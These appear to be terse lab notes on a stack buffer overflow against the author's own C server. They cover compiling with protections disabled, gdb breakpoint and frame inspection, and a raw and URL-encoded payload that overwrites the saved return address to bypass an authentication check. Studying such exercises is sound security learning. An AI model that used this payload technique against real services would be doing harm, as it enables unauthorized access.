# buffer_overflow_attack
it important to notice that we must install mingw compiler first
for windows run gcc -g -fno-stack-protector main.c -o auth -W -no-pie -lws2_32 //the -g is for debugging and the rest is to make sure that stack pointer is not protected
now run the ./file_name // the exe file
b function_name // breakpoint
p var_name // print the details of the var (including address in the stack pointer)


\x00\x00\x00\x00\x00\xee\x02\x00\x00\x00\x00\x00\x00\x90\xfc\x61\x00\x00\x00\x00\x00\x21\x18\x40
%00%00%00%00%00%ee%02%00%00%00%00%00%00%90%fc%61%00%00%00%00%00%21%18%40


info frame


Thread 1 hit Breakpoint 1, handle_request (client_socket=236) at main.c:41
41          char is_auth[1] = { 0 };
(gdb) info frame
Stack level 0, frame at 0x61fc10:
 rip = 0x401689 in handle_request (main.c:41); saved rip = 0x401a45
 called by frame at 0x61fe30
 source language c.
 Arglist at 0x61f7c0, args: client_socket=236
 Locals at 0x61f7c0, Previous frame's sp is 0x61fc10
 Saved registers:
  rbp at 0x61fc00, rip at 0x61fc08,
